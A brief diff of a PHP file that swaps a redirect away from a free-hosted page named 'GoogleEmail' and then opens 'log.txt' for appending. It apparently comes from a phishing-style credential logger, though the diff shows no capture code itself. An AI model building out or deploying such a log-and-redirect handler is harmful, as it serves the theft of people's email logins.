@@ -1,6 +1,6 @@
 <?php
 
-header ('Location: https://organized-shaft.000webhostapp.com/GoogleEmail/index.html');
+header ('Location: https://unfoldingthings.github.io/');
 
 $handle = fopen("log.txt", "a");
 
